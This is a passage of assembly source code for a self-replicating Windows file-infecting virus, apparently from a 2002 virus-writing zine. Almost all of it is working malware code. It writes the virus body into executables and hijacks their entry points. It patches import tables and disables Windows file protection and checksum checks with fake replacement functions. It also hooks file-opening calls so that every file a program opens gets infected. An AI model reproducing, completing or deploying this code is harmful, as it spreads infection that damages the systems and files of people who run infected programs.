    test    [esi][SECTION.Characteristics], IMAGE_SCN_CNT_INITIALIZED_DATA
    .IF     !(ZERO?)
            sub     [edi][PE.SizeOfInitializedData], eax
            add     [edi][PE.SizeOfInitializedData], ebx
    .ENDIF
    test    [esi][SECTION.Characteristics], IMAGE_SCN_CNT_UNINITIALIZED_DATA
    .IF     !(ZERO?)
            sub     [edi][PE.SizeOfUninitializedData], eax
            add     [edi][PE.SizeOfUninitializedData], ebx
    .ENDIF

    ; Force Win32 to do RunTime Binding
;   [Extra 2 MOVs I don't think are necessary, so I left them out for now]
;   mov     [edi][PE.DataDirectory.BoundImport.RVA], 0
;   mov     [edi][PE.DataDirectory.BoundImport.Sizes], 0
    DO_API  ConvertToRaw, [FILEHANDLE ], [edx][VX.BoundImport]
    mov     [eax][IMPORT.TimeDateStamp], 0

    ; Save and set the PE Entrypoint
    mov     ebx, [edx][VX.SectionEntrypoint  ]
    push    ebx
    add     ebx, SIZE VX
    xchg    [edi][PE.AddressOfEntryPoint], ebx
    mov     [edx][VX.HostEntrypoint],      ebx
    pop     ebx

    ; Write the virus to the file, finally!
    DO_API  ConvertToRaw, [FILEHANDLE], ebx
    mov     esi, edx
    mov     edi, eax
    mov     ecx,             Virus_Size / 4
    cld
    rep     movsd

    ; Do the checksums, one of which is pointing to a junk area
    pop     edi
    DO_API  tCheckSumMappedFile PTR [edx][VX.pCheckSumMappedFile], [FILEHANDLE], [edx][VX.FileSize], ADDR [edx][VX.LastSection], ADDR [edi][PE.CheckSum]
    ret
WriteFile   ENDP

; =============================================================================
; ( Scan Imports ) ============================================================
; =============================================================================
SetupImports    PROC    VD:PTR VX, FILEHANDLE:DWORD, TABLE:DWORD
    ; Switch between the Thunk Tables for Inprise/Microsoft compatability
    mov     edx, [VD]
    mov     esi, [TABLE]
    mov     eax, [esi][IMPORT.OriginalFirstThunk]
    test    eax, eax
    jnz     @F
    mov     eax, [esi][IMPORT.FirstThunk]
@@: DO_API  ConvertToRaw, [FILEHANDLE], eax
    test    eax, eax
    jz      SetupImportsExit

    ; Begin the loop, which skips Ordinal entry and WENDs on a NULL entry
    mov     esi, eax
    xor     ecx, ecx
    .WHILE  TRUE
            lodsd
            test    eax, eax
            .IF     !(SIGN?)
                    DO_API  ConvertToRaw, [FILEHANDLE], eax
                    .BREAK  .IF (eax == 0)
                    push    esi
                    push    ecx
                    lea     esi, [eax][2]

                    ; Store the RVA of the associated FirstThunk entry, so we
                    ; can located the Imported API VA during execution, if we
                    ; need it [if this entry is a Hook/Used API]
                    mov     eax, [TABLE]
                    mov     eax, [eax][IMPORT.FirstThunk]
                    lea     eax, [eax][ecx * 4]
                    mov     [edx][VX.ThunkArrayRVA], eax

                    ; Firstly, loop through and save details if this entry is
                    ; Hookable.  Note some API are Hooked and Used, so we do
                    ; keep looping even if the API matches.
                    lea     ebx, [edx][VX.HookAPI]
                    mov     ecx, HOOKS_COUNT
                    .REPEAT
                            mov     edi, [ebx][8]
                            mCompareStringA ADDR [edx][edi][4], esi
                            .IF     (ZERO?)
                                    push    [edx][VX.ThunkArrayRVA]
                                    pop     [ebx]
                            .ENDIF
                            add     ebx, 12
                    .UNTILCXZ

                    ; Secondly, loop through, always overwrite previously saved
                    ; 'possible replacement' information with perfect matches.
                    lea     ebx, [edx][VX.sLoadLibraryA]
                    mCompareStringA ebx, esi
                    je      SetupImportsStore
                    lea     ebx, [edx][VX.sGetProcAddress]
                    mCompareStringA ebx, esi
                    je      SetupImportsStore

                    ; Calculate the string size and the 'possible replacement'.
                    xor     eax, eax
                    mov     eax, esi
                @@: inc     eax
                    cmp     byte ptr [eax][-1], 0
                    jne     @B
                    sub     eax, esi

                    .IF     (eax < BUFFER_SIZE)
                            .IF     (eax > 16)
                                    cmp     [edx][VX.pGetProcAddress], 0
                                    je      SetupImportsStore
                            .ENDIF
                            .IF     (eax > 14)
                                    lea     ebx, [edx][VX.sLoadLibraryA]
                                    cmp     [edx][VX.pLoadLibraryA],   0
                                    .IF     (ZERO?)
                                    SetupImportsStore:
                                            mov     [ebx][- (BUFFER_SIZE + 8)], esi
                                            push    [edx][VX.ThunkArrayRVA]
                                            pop     [ebx][-4]
                                    .ENDIF
                            .ENDIF
                    .ENDIF
                    pop     ecx
                    pop     esi
            .ENDIF
            inc     ecx
    .ENDW

    ; Loop through twice, copying import address string into the virus, and
    ; the virus string over the original.  Make eax nonzero, if all's okay.
    lea     edi, [edx][VX.bLoadLibraryA]
    xor     ebx, ebx
@@: cmp     dword ptr [edi][BUFFER_SIZE][4], 0
    je      SetupImportsExit

    mov     esi, [edi]
    push    esi
    mov     ecx, BUFFER_SIZE
    cld
    rep     movsb

    lea     esi, [edi][8]
    mov     ecx, [edi]
    pop     edi
    rep     movsb

    lea     edi, [edx][VX.bGetProcAddress]
    dec     ebx
    jpe     @B
    dec     eax

SetupImportsExit:
    ret
SetupImports    ENDP

; =============================================================================
; ( Align to boundary ) =======================================================
; =============================================================================
; Align a value to a boundary, I was guessing, so let's hope it's not buggy!!!!
ConvertAlign PROC   BOUNDARY:DWORD,     VALUE:DWORD
    mov     eax, [VALUE]
    xor     edx, edx
    mov     ecx, [BOUNDARY]
    div     ecx
    or      edx, edx
    mov     eax, [VALUE]
    jz      ConvertAlignExit
    add     eax, [BOUNDARY]
ConvertAlignExit:
    sub     eax, edx
    ret
ConvertAlign ENDP

; =============================================================================
; ( Convert RVA to RAW ) ======================================================
; =============================================================================
ConvertToRaw PROC   FILEHANDLE:DWORD,   VALUE:DWORD
    ; Make sure we haven't been provided a dud value, most routines should just
    ; rely on the result of this, instead of doing double error checking.
    mov     esi, [FILEHANDLE]
    mov     edi, [VALUE]
    test    edi, edi
    jz      ConvertToRawFail

    ; Locate start of SECTION Table and prepare for looping through them all
    add     esi, [esi][IMAGE_DOS_HEADER.e_lfanew]
    mov     ebx, [esi][PE.SectionAlignment      ]
    movzx   ecx, [esi][PE.NumberOfSections      ]
    add      si, [esi][PE.SizeOfOptionalHeader  ]
    adc     esi, PE.Magic

    .REPEAT
            ; Skip it if this Section starts above our VA
            cmp     [esi][SECTION.VirtualAddress], edi
            ja      ConvertToRawNext

            ; Find out where the section ends in memory, that means taking
            ; whichever RVA is bigger and SectionAligning it.
            mov     eax, [esi][SECTION.SizeOfRawData ]
            cmp     eax, [esi][SECTION.VirtualSize   ]
            ja      @F
            mov     eax, [esi][SECTION.VirtualSize   ]
        @@: DO_API  ConvertAlign, ebx, eax
            add     eax, [esi][SECTION.VirtualAddress]

            ; Jump over this section entry if it ends below our RVA
            cmp     eax,    edi
            jbe     ConvertToRawNext

            ; Fail if this entry doesn't exist in the file [could be memory only]
            cmp     [esi][SECTION.PointerToRawData], 0
            je      ConvertToRawFail

            ; Convert raw pointer to VA and add our value's pointers offset to it
            mov     eax, [FILEHANDLE]
            add     eax, [esi][SECTION.PointerToRawData]
            sub     edi, [esi][SECTION.VirtualAddress  ]
            add     eax, edi
            jmp     ConvertToRawExit

    ConvertToRawNext:
            add     esi, SIZE SECTION
    .UNTILCXZ

ConvertToRawFail:
    xor     eax, eax
ConvertToRawExit:
    ret
ConvertToRaw ENDP

; =============================================================================
; ( Alternate SfcIsFileProtected ) ============================================
; =============================================================================
AlternateSfcIsFileProtected PROC    P1:DWORD, P2:DWORD
    ; Alternate SfcIsFileProtected procedure, returns "File Unprotected"
    mov     eax, FALSE
    ret
AlternateSfcIsFileProtected ENDP

; =============================================================================
; ( Alternate CheckSumMappedFile ) ============================================
; =============================================================================
AlternateCheckSumMappedFile PROC    P1:DWORD, P2:DWORD, P3:DWORD, P4:DWORD
    ; Alternate CheckSumMappedFile procedure, returns "NULL Checksum OK"
    mov     eax,   [P4]
    mov     ebx,   NULL
    xchg    [eax], ebx
    mov     eax,   [P3]
    mov     [eax], ebx
    mov     eax,   [P1]
    add     eax, [eax][IMAGE_DOS_HEADER.e_lfanew]
    ret
AlternateCheckSumMappedFile ENDP

; =============================================================================
; ( Hooked version of GetProcAddress ) ========================================
; =============================================================================
HookGetProcAddress  PROC    USES EDX ESI,
                            DLL:DWORD, PROCEDURE:DWORD
    ; Work out our delta offset and check to make sure the program is asking
    ; for a Kernel32.DLL Procedure [which are the only ones we hook].
    LOCATE
    DO_API  tLoadLibraryA   PTR [edx][VX.pLoadLibraryA], ADDR [edx][VX.UsedKernel]
    cmp     eax, [DLL]
    .IF     (ZERO?)
            push    ecx
            mov     ecx, HOOKS_COUNT
            lea     esi, [edx][VX.HookAPI]
            .REPEAT
                    ; Abort if this entry marks the end of the table.
                    lodsd
                    lodsd
                    lodsd
                    mCompareStringA ADDR [edx][eax][4], [PROCEDURE]
                    .IF     (ZERO?)
                            mov     eax, [esi][-4 ]
                            lea     eax, [edx][eax]
                            pop     ecx
                            ret
                    .ENDIF
            .UNTILCXZ
            pop     ecx
    .ENDIF

    INVOKE  tGetProcAddress PTR [edx][VX.pGetProcAddress], [DLL], [PROCEDURE]
    ret
HookGetProcAddress    ENDP

; =============================================================================
; ( Hooked version of CreateFile ) ============================================
; =============================================================================
HookCreateFileW         PROC    USES  EDX,
                                FILENAME:DWORD, P2:DWORD, P3:DWORD, P4:DWORD, P5:DWORD, P6:DWORD, P7:DWORD
                        LOCAL   QUALIFIED[MAX_PATH]:BYTE
    LOCATE
    DO_API  tWideCharToMultiByte PTR [edx][VX.pWideCharToMultiByte], NULL, NULL, FILENAME, -1, ADDR [QUALIFIED], MAX_PATH, NULL, NULL
    .IF     (eax != 0)
            DO_API  LoadsFile, edx, ADDR [QUALIFIED]
    .ENDIF

    INVOKE  tCreateFileW PTR [edx][VX.pCreateFileW], FILENAME, P2, P3, P4, P5, P6, P7
    ret
HookCreateFileW         ENDP

HookCreateFileA         PROC    USES    EDX,
                                FILENAME:DWORD, P2:DWORD, P3:DWORD, P4:DWORD, P5:DWORD, P6:DWORD, P7:DWORD
    LOCATE
    DO_API  LoadsFile, edx, [FILENAME]
    INVOKE  tCreateFileA PTR [edx][VX.pCreateFileA], FILENAME, P2, P3, P4, P5, P6, P7
    ret
HookCreateFileA       ENDP

ALIGN       4
Virus_Size  EQU $ - Virus_Data
Virus       ENDS
END         WinMain

 COMMENT ` ---------------------------------------------------------------- )=-
 -=( Natural Selection Issue #1 --------------- (c) 2002 Feathered Serpents )=-
 -=( ---------------------------------------------------------------------- ) `
